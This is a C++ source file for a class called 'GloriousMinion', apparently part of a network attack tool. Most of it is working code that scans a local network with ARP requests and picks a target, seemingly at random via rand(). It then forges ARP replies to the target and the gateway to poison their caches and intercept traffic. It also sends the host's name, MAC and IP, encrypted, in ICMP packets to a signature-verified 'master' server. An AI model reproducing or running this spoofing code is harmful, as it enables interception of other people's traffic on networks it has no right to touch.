#include "include/glorious_minion.h"

#ifndef _WIN32
    /* List the name of all available interfaces (Linux) */
    void GloriousMinion::listInterfaceNames()
    {
        struct if_nameindex *if_nidxs, *intf;

        if_nidxs = if_nameindex();
        if ( if_nidxs != NULL ) {
            //Interface name must be returned from here
            cout << "|Interface index";
            for (intf = if_nidxs; intf->if_index != 0 || intf->if_name != NULL; intf++) {
                cout << "\t|\t" << intf->if_index;
            }
            cout << "\t|" << endl;

            cout << "|Interface name" << "\t";
            for (intf = if_nidxs; intf->if_index != 0 || intf->if_name != NULL; intf++) {
                cout << "\t|\t" << intf->if_name;
            }
            cout << "\t|" << endl;

            cout << "|Active" << "\t\t";
            for (intf = if_nidxs; intf->if_index != 0 || intf->if_name != NULL; intf++) { //<--Here the user must choose interface
                choose_interface_name(intf->if_name);
            }
            cout << "\t|" << endl;
        }
        if_freenameindex(if_nidxs);
    }
#else
    /* List the name of all available interfaces (Windows) */
    void GloriousMinion::listInterfaceNames()
    {
        /* Declare and initialize variables */

        // It is possible for an adapter to have multiple
        // IPv4 addresses, gateways, and secondary WINS servers
        // assigned to the adapter.
        //
        // Note that this sample code only prints out the
        // first entry for the IP address/mask, and gateway, and
        // the primary and secondary WINS server for each adapter.

        PIP_ADAPTER_INFO pAdapterInfo;
        PIP_ADAPTER_INFO pAdapter = NULL;
        DWORD dwRetVal = 0;
        UINT i;

        /* variables used to print DHCP time info */
        struct tm newtime;
        char buffer[32];
        errno_t error;

        ULONG ulOutBufLen = sizeof (IP_ADAPTER_INFO);
        pAdapterInfo = (IP_ADAPTER_INFO *) MALLOC(sizeof (IP_ADAPTER_INFO));
        char* chosen_adapter;
        if (pAdapterInfo == NULL) {
            printf("Error allocating memory needed to call GetAdaptersinfo\n");
            return;
        }
        // Make an initial call to GetAdaptersInfo to get
        // the necessary size into the ulOutBufLen variable
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
            FREE(pAdapterInfo);
            pAdapterInfo = (IP_ADAPTER_INFO *) MALLOC(ulOutBufLen);
            if (pAdapterInfo == NULL) {
                printf("Error allocating memory needed to call GetAdaptersinfo\n");
                return;
            }
        }

        if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
            pAdapter = pAdapterInfo;
            while (pAdapter) {
                chosen_adapter = pAdapter->IpAddressList.IpAddress.String;
                int i = choose_interface_name(chosen_adapter);
                if(i == TRUE){
                    cout << "FOUND" << endl;
                }
                printf("\tComboIndex: \t%d\n", pAdapter->ComboIndex);
                printf("\tAdapter Name: \t%s\n", pAdapter->AdapterName);
                printf("\tAdapter Desc: \t%s\n", pAdapter->Description);
                printf("\tAdapter Addr: \t");
                for (i = 0; i < pAdapter->AddressLength; i++) {
                    if (i == (pAdapter->AddressLength - 1))
                        printf("%.2X\n", (int) pAdapter->Address[i]);
                    else
                        printf("%.2X-", (int) pAdapter->Address[i]);
                }
                printf("\tIndex: \t%d\n", pAdapter->Index);
                printf("\tType: \t");
                switch (pAdapter->Type) {
                case MIB_IF_TYPE_OTHER:
                    printf("Other\n");
                    break;
                case MIB_IF_TYPE_ETHERNET:
                    printf("Ethernet\n");
                    break;
                case MIB_IF_TYPE_TOKENRING:
                    printf("Token Ring\n");
                    break;
                case MIB_IF_TYPE_FDDI:
                    printf("FDDI\n");
                    break;
                case MIB_IF_TYPE_PPP:
                    printf("PPP\n");
                    break;
                case MIB_IF_TYPE_LOOPBACK:
                    printf("Loopback\n");
                    break;
                case MIB_IF_TYPE_SLIP:
                    printf("Slip\n");
                    break;
                default:
                    printf("Unknown type %ld\n", pAdapter->Type);
                    break;
                }

                printf("\tIP Address: \t%s\n",
                        pAdapter->IpAddressList.IpAddress.String);
                printf("\tIP Mask: \t%s\n", pAdapter->IpAddressList.IpMask.String);

                printf("\tGateway: \t%s\n", pAdapter->GatewayList.IpAddress.String);
                printf("\t***\n");

                if (pAdapter->DhcpEnabled) {
                    printf("\tDHCP Enabled: Yes\n");
                    printf("\t  DHCP Server: \t%s\n",
                            pAdapter->DhcpServer.IpAddress.String);

                    printf("\t  Lease Obtained: ");
                    /* Display local time */
                    error = _localtime32_s(&newtime, (__time32_t*) &pAdapter->LeaseObtained);
                    if (error)
                        printf("Invalid Argument to _localtime32_s\n");
                    else {
                        // Convert to an ASCII representation
                        error = asctime_s(buffer, 32, &newtime);
                        if (error)
                            printf("Invalid Argument to asctime_s\n");
                        else
                            /* asctime_s returns the string terminated by \n\0 */
                            printf("%s", buffer);
                    }

                    printf("\t  Lease Expires:  ");
                    error = _localtime32_s(&newtime, (__time32_t*) &pAdapter->LeaseExpires);
                    if (error)
                        printf("Invalid Argument to _localtime32_s\n");
                    else {
                        // Convert to an ASCII representation
                        error = asctime_s(buffer, 32, &newtime);
                        if (error)
                            printf("Invalid Argument to asctime_s\n");
                        else
                            /* asctime_s returns the string terminated by \n\0 */
                            printf("%s", buffer);
                    }
                } else
                    printf("\tDHCP Enabled: No\n");

                if (pAdapter->HaveWins) {
                    printf("\tHave Wins: Yes\n");
                    printf("\t  Primary Wins Server:    %s\n",
                            pAdapter->PrimaryWinsServer.IpAddress.String);
                    printf("\t  Secondary Wins Server:  %s\n",
                            pAdapter->SecondaryWinsServer.IpAddress.String);
                } else
                    printf("\tHave Wins: No\n");
                pAdapter = pAdapter->Next;
                printf("\n");
            }
        } else {
            printf("GetAdaptersInfo failed with error: %d\n", dwRetVal);

        }
        if (pAdapterInfo)
            FREE(pAdapterInfo);
    }

#endif
    int GloriousMinion::prepared_to_nuke()
    {
        // Prepare the DNS Cache Poisoning attack
        if(!open_device()) {
            printf("Can't open device\n");
        }
        else if (this->communicator == NULL) {
            cerr << "Device does not eexist" << endl;
        }
        else {
            //Initiate the attack!
            open_essential_tools();
            this->public_key = X509_get_pubkey(this->cert);

            if(!this->public_key) {
                cout << "huh??" << endl;
            }

            this->network_data.public_key.key_buffer = extract_public_tools();
            cout << this->network_data.public_key.key_buffer << endl;

            create_personal_public_key(this->network_data.public_key.key_buffer);
            get_key_network_details();

            return TRUE;
        }
        return FALSE;
    }

    void GloriousMinion::get_key_network_details()
    {
        IPNetwork the_network_identifier(this->communicator->getDefaultGateway().toString(), 24);

        this->gateway_ip = this->communicator->getDefaultGateway().toString();
        this->found_ip = the_network_identifier.getLowestAddress().toString();

        this->src_mac_addr = this->communicator->getMacAddress().toString();
        this->servers_ip = this->communicator->getIPv4Address().toString();

        this->src_ip = this->communicator->getIPv4Address().toString();
        this->network_mac =  NetworkUtils::getInstance().getMacAddress(IPv4Address(this->gateway_ip), this->communicator, this->capture_time,
                                                          this->src_mac_addr, this->src_ip, this->timeoutSec).toString();

        cout << "[Lowest IP address]: " << the_network_identifier.getLowestAddress() << endl;
        cout << "[The Network Mac Address]: " << this->network_mac << endl;

        this->network_data.default_gateway = this->gateway_ip;
        this->network_data.network_mac = this->network_mac;

        this->network_data.my_ip = this->src_ip;
        this->network_data.my_mac = this->src_mac_addr;
        this->network_data.my_ipv6 = this->communicator->getIPv6Address().toString();
    }

    void GloriousMinion::tester()
    {
        show_sexp("[KEY USED]:\n",this->personal_pub_key);
    }

    /* Create ARP response packets for (master_server->router) packet */
    void GloriousMinion::create_network_arp_replies()
    {
        string gateway = this->communicator->getDefaultGateway().toString();
        this->arpNetResponses = create_arp_is_at(this->target_user_ip, gateway, this->network_mac);
    }

    /* Create ARP response packets for (master_server->client) packet */
    void GloriousMinion::create_target_replies()
    {
        string gateway = this->communicator->getDefaultGateway().toString();
        this->arpTargetResponses = create_arp_is_at(gateway, this->target_user_ip,  this->target_user_mac);
    }

    /* Create the ARP response packet */
    RawPacket GloriousMinion::create_arp_is_at(string new_route, string target_ip, string mac_address)
    {
        Packet newPacket(this->pack_size);
        EthLayer ethernetLayer(MacAddress(this->src_mac_addr), MacAddress(mac_address)); //Previously the dst was mac_Address(depended on the ip)

        ArpOpcode arp_opcode = ARP_REPLY;
        ArpLayer arpLayer(arp_opcode, MacAddress(this->src_mac_addr), MacAddress(mac_address),
                          IPv4Address(new_route), IPv4Address(target_ip));

        newPacket.addLayer(&ethernetLayer);
        newPacket.addLayer(&arpLayer);

        master_calculator(&newPacket);
        return *newPacket.getRawPacket();
    }

    /* Create the ARP request packet */
    RawPacket GloriousMinion::create_arp_who_is(string target_ip)
    {
        Packet newPacket(this->pack_size);
        EthLayer ethernetLayer(MacAddress(this->src_mac_addr), MacAddress(this->broadcast_mac));

        ArpOpcode arp_opcode = ARP_REQUEST;
        ArpLayer arpLayer(arp_opcode, MacAddress(this->src_mac_addr), MacAddress(this->broadcast_mac),
                          IPv4Address(this->src_ip), IPv4Address(target_ip));

        newPacket.addLayer(&ethernetLayer);
        newPacket.addLayer(&arpLayer);

        master_calculator(&newPacket);
        return *newPacket.getRawPacket();
    }

    void GloriousMinion::sniffer()
    {
        lock_guard<mutex> guard(this->the_lock);

        Capture_packet();
    }

    /* This creates and sends the ICMP packet with hash(acts regardless of reponse) */
    RawPacket GloriousMinion::Identify()
    {
        string hashed_message;
        Packet p(120);

        EthLayer etherLayer(this->network_data.my_mac, this->target_user_mac);
        IPv4Layer ipLayer(IPv4Address(this->src_ip), IPv4Address(this->target_user_ip));

        IcmpLayer icmpLayer;
        uint16_t id = 8;

        uint16_t sequence = 0;
        uint64_t timestamp = 0;

        hashed_message = this->network_data.hasher6969(this->network_data.public_key.key_buffer  +
            this->src_ip +
            this->network_data.default_gateway +
            this->network_data.my_mac);

        ipLayer.getIPv4Header()->timeToLive = 255;
        icmpLayer.getIcmpHeader()->type = 8;

        icmpLayer.setEchoReplyData(id, sequence, timestamp,
            (uint8_t*)hashed_message.c_str(), hashed_message.length());
        hashed_message.clear();
        p.addLayer(&etherLayer);
        p.addLayer(&ipLayer);

        p.addLayer(&icmpLayer);
        p.computeCalculateFields();
        this->communicator->sendPacket(&p);

        return *p.getRawPacket();
    }

    /* Find IP addresses of potential targets in the local network */
    void GloriousMinion::Map_The_Net()
    {
        lock_guard<mutex> guard(this->the_lock);
        string target;

        restart_timer();
        Request_Mac_Address(this->found_ip);
        wait();

        int index = this->network_data.potential_users.size()-1;
        this->network_data.counter = (int)this->network_data.potential_users.size();
        this->scanned_prefixes = index;

        if(!this->network_data.potential_users.empty()) {
            target = std::get<1>(this->network_data.potential_users[index]);

            this->network_data.stats.clear();
            cout << "\r[Number of targets]: " << this->scanned_prefixes + 1 << flush;
        }
        move_to_next_user(target, this->scanned_prefixes);
        Restart_Mapping(this->scanned_prefixes);
        trigger_spoof();
    }

    /* Restart the timer, for cases where no client was found */
    void GloriousMinion::restart_timer()
    {
        if(this->started_time_measurement == 0) {
            this->timer = clock();
            this->started_time_measurement = 1;
        }
    }

    /* Send an ARP request packet to find potential clients on the network */
    void GloriousMinion::Request_Mac_Address(string target_ip)
    {
        RawPacket requestData(create_arp_who_is(target_ip));
        Packet requestPacket(&requestData);
        this->communicator->sendPacket(&requestPacket);
    }

    /* Wait a maximum of 0.5 seconds before checking if a mac address was found with the IP address
        * stored in this->found_ip
    */
    void GloriousMinion::wait()
    {
        clock_t e = clock();
        while(TRUE) {
            double time_taken = ((double)(clock() - e))/CLOCKS_PER_SEC;
            if(time_taken >= 0.5) {
                this->network_data.stats.clear();
                break;
            }
        }

        this->stop_capture();
    }

    /* Increment the IP address by one and search for mac address that has this ip address */
    void GloriousMinion::move_to_next_user(string mac_address, int user_index)
    {
        this->found_ip = increment_address(this->found_ip.c_str());
        this->scanned_prefixes = user_index;
    }

    /* Restart the search for clients */
    void GloriousMinion::Restart_Mapping(int user_index)
    {
        if(user_index == 511) {
            this->scanned_prefixes = 0;
            this->found_ip = this->communicator->getDefaultGateway().toString();
            this->network_data.potential_users.clear();
        }
    }

    /* If the conditions below are met, trigger the ARP spoof */
    void GloriousMinion::trigger_spoof()
    {
        double new_time = ((double)(clock() - this->timer))/CLOCKS_PER_SEC;
        if((this->network_data.counter == this->network_data.previous_counter + 4) ||
            ((new_time > 10) && (!this->network_data.potential_users.empty()))) {
            this->network_data.previous_counter = this->network_data.counter;
            this->started_time_measurement = 0;

            this->spoof_inititiated = true;
            this->network_data.spoof_switch = true;
        }
    }

    void GloriousMinion::sniffer_spoof()
    {
        lock_guard<mutex> guard(this->the_lock);
        Capture_packet(this->target_user_ip, this->target_user_mac);
    }

    void GloriousMinion::handle_received_data()
    {
        lock_guard<mutex> guard(this->the_lock);
        if(this->spoof_inititiated){
            RawPacket package = Identify();
            send_encrypted_message(&package);
        }

        if(this->network_data.user_device.answered[0] ||
            this->network_data.user_device.answered[1]) {

            cout << "NOT EMPTY " << this->network_data.hashed_message.c_str() << endl;

            this->UnHandledMessage = this->network_data.hashed_message.c_str();
            cout << this->UnHandledMessage << endl;
           // exit(0);
            Handle_situation(this->UnHandledMessage);
        }
    }

    void GloriousMinion::Change_user_route()
    {
        try {
            lock_guard<mutex> guard(this->the_lock);
         //   cout << "PEW PEW PEW PEW" << endl;
            send_changes();
        }
        catch (logic_error&e) {
           cout << "[Exception caught]\n" << e.what() << endl;
        }
    }

    void GloriousMinion::send_changes()
    {

        if(!this->communicator->sendPacket(this->arpTargetResponses)) {
            cout << "[Failed to send packet to target]" << endl;
        }
        if(!this->communicator->sendPacket(this->arpNetResponses)) {
            cout << "[Failed to send packet to the default gateway]" << endl;
        }
    }

    int GloriousMinion::Choose_users()
    {
        lock_guard<mutex> guard(this->the_other_lock);
        int dec;
        List_potential_users();

        dec = enter_target_indexs(0);
        return dec;
    }

    void GloriousMinion::List_potential_users()
    {
        cout << "||==============|=======================|===============================||" <<
        endl << "||     Index    |      IP Address       |           MAC Address         ||" <<
        endl << "||==============|=======================|===============================||" <<
        endl;

        for(int index = 0 ; index < (int)this->network_data.potential_users.size() ; index++){
            cout << "||\t" << index << "\t|\t" << std::get<0>(this->network_data.potential_users[index])
            << "\t|\t" << std::get<1>(this->network_data.potential_users[index])  << "\t||" <<
            endl << "||--------------|-----------------------|-------------------------------||" <<
            endl;
        }
    }

    int GloriousMinion::enter_target_indexs(int list_type)
    {
        int converted_index, dec;
        string chosen_index;

        cout << "Enter the index of the ip(type -1 to return to menu):\t";

        converted_index = rand() % this->network_data.potential_users.size() - 1;
        cout << converted_index << endl;
        dec = store_chosen_targets(converted_index, list_type);

        chosen_index.clear();
        return dec;
    }

    int GloriousMinion::store_chosen_targets(int converted_index, int list_type)
    {
        while(true){
            if(list_type == 0) {
                if(store_for_spoof(converted_index) == 0){
                    return 0;
                }
            }
        }
    }

    int GloriousMinion::store_for_spoof(int converted_index)
    {
        cout << "STORE TARGET IPS & MACS" << endl;

        while(TRUE) {
            if((converted_index >= 0) && (converted_index < (int)this->network_data.potential_users.size())) {
                this->target_user_ip = get<0>(this->network_data.potential_users[converted_index]);
                this->target_user_mac = get<1>(this->network_data.potential_users[converted_index]);

                this->network_data.target_ipv4 = get<0>(this->network_data.potential_users[converted_index]);
                this->network_data.target_mac = get<1>(this->network_data.potential_users[converted_index]);

                print_targets(this->target_user_ip);
                cout << "<< TACTICAL NUKE INCOMING >>" << endl;
                return 0;
            } else {
                cout << "Please choose a client that is part of the list" << endl;
                converted_index = rand() % this->network_data.potential_users.size();
                cout << this->network_data.potential_users.size() << converted_index << endl;
            }
        }
    }

    /* Print the ip of the target */
    void GloriousMinion::print_targets(string target_ip)
    {

        cout << "[You have chosen to heelp]" << target_ip << endl;
    }

    /* Send the encrypted message */
    void GloriousMinion::send_encrypted_message(RawPacket* pack)
    {
        Packet p(pack);
        IcmpLayer* icmpLayer = (IcmpLayer*)p.getLayerOfType(ICMP);
        uint16_t id = 8;
        uint16_t sequence = 0;
        uint64_t timestamp = 0;

        string encrypted_message = encrypt_details();

        icmpLayer->setEchoReplyData(id, sequence,
            timestamp, (uint8_t*)encrypted_message.c_str(), encrypted_message.length());

        p.computeCalculateFields();
        this->communicator->sendPacket(&p);
    }

    /* Encrypt your details
        *  details: Username + Mac Address + IPv4 Address
    */
    string GloriousMinion::encrypt_details()
    {
        /* Create encrypted data */
        gcry_sexp_t c_cipher1, plain1;
        string details = "Username: " + get_username() + " ;1;" +
        "MAC: " + this->src_mac_addr + " ;2;" +
        "Ipv4: " + this->network_data.my_ip + " ;3;";
        string encrypted_message;

        plain1 = create_plain_text_object(details);
        c_cipher1 = encrypt_data(plain1, this->personal_pub_key);

        //show_sexp("[ENC data]:\n", c_cipher1);
        encrypted_message = sexp_to_string(c_cipher1);

        return encrypted_message;
    }

    /* Check the message source and check if the client was bought in by the product */
    void GloriousMinion::Handle_situation(string message_data)
    {
        cout << "hash???? " << "[ " << this->network_data.hashed_message << " ]" << endl;
        if(this->network_data.user_device.answered[0] || this->network_data.user_device.answered[1]) {
            cout << "[STOP SPOOF MOVE ON]" << endl;
            this->spoof_inititiated = false;
            this->network_data.spoof_switch = false;
        }
        //this->network_data.unhandled_users.erase();
        //exit(0);
            //   }
        Authenticate_message(message_data);
    }

    /* Check if the message is the servers message and came from a trusted server */
    void GloriousMinion::Authenticate_message(string message_data)
    {
        if(message_data.find("sig-val") == std::string::npos) {
            cout << "[No special message]" << message_data << endl;
            return;
        }

        cout << "[This is the message]" << message_data << endl;
        Verify_message_structure(message_data);
        get<0>(this->network_data.master_address) = "";
    }

    /* Check if the message is structured correctly */
    void GloriousMinion::Verify_message_structure(string message_data)
    {
        string message_hash =
            this->network_data.hasher6969(this->network_data.public_key.key_buffer  +
            this->src_ip +
            this->network_data.default_gateway +
            this->network_data.my_mac);
        string param_list[3] = { message_hash,  "(sig-val", "(enc-val"};

        bool (GloriousMinion::*message_verifiers[2])(string, string[3]) = {
            &GloriousMinion::are_params_there,
            &GloriousMinion::are_params_in_order
        };

        for(int i = 0 ; i < 2 ; i++) {
            if(!(this->*message_verifiers[i])(message_data, param_list)) {
                cout << "[Decrypted message is malformed]" << endl;
                return;
            }
        }
        message_hash.clear();
        dissect_message(message_data);
    }

    /* Check if the message parameters are present in the message */
    bool GloriousMinion::are_params_there(string unencrypted_data, string param_list[3])
    {
        for(int i = 0 ; i < 3 ; i++) {
            if(unencrypted_data.find(param_list[i]) == std::string::npos){
                return false;
            }
        }
        return true;
    }

    /* Check if the message parameters are in the correct order */
    bool GloriousMinion::are_params_in_order(string unencrypted_data, string param_list[3])
    {
        for(int i = 0 ; i < 3 ; i++) {
            for(int j = i + 1 ; j < 3 ; j++) {
                if(unencrypted_data.find(param_list[i]) >= unencrypted_data.find(param_list[j])){
                    return false;
                }
            }
        }

        return true;
    }

    /* Dissect the message componenets */
    void GloriousMinion::dissect_message(string message_data)
    {
        string the_hash = message_data.substr(0, message_data.find("(sig-val"));
        cout << "[This is the hash]" << the_hash << endl;

        string sig = message_data.substr(
            message_data.find("(sig-val"),
            message_data.find("(enc-val") - message_data.find("(sig-val"));
        cout << "[This is the signature]" << sig << endl;

        string enc = message_data.substr(
            message_data.find("(enc-val"),
            message_data.length() - message_data.find("(enc-val") - 2);
        cout << "[This is the data]" << enc << endl;

        verify_signature(sig, the_hash);
    }

    /* Check if there is an authentic signature */
    void GloriousMinion::verify_signature(string sig, string the_hash)
    {
        gcry_sexp_t signed_data;
        signed_data = string_to_sexp(sig);

        if(signed_data == NULL) {
            cout << "[Malformed signature]: " << sig << endl;
            return;
        }

        verify_signature_auth(signed_data, the_hash);
    }

    /* Check if the signature came from a trusted authority */
    void GloriousMinion::verify_signature_auth(gcry_sexp_t signed_data, string the_hash)
    {
        gcry_sexp_t v_hash;
        v_hash = create_plain_text_object(the_hash);

        if(verify_data(v_hash, signed_data) == -1){
            printf("Verification failed, was this signed by a verifiable source?\n");
            return;
        } else {
            cout << "The source is the master!" << endl;
            /* Assign the ip of the default gateway */
            if(!get<0>(this->network_data.master_address).empty() &&
                (IPv4Address().isValidIPv4Address(get<0>(this->network_data.master_address)) ||
                 IPv6Address().isValidIPv6Address(get<0>(this->network_data.master_address)))) {
                cout << "YEEEES" << endl;
                this->servers_ip = get<0>(this->network_data.master_address);
                this->server_ip_address = this->servers_ip;

                this->found_server = true;
                this->spoof_inititiated = false;
                this->network_data.spoof_switch = false;
                this->network_data.user_device.answered[0] = false;
                this->network_data.user_device.answered[1] = false;
            }
            return;
        }
    }

    /* Get the device's host name (Here we will refer to it as the username) */
    string GloriousMinion::get_username()
    {
        string username;
        char hostname[1024];

        hostname[1023] = '\0';
        gethostname(hostname, 1023);

        username = hostname;
        if (!username.empty()) {
           // cout << "Username: " << username << endl;
        } else {
            cout << "Failed to get username" << endl;
        }

        return username;
    }
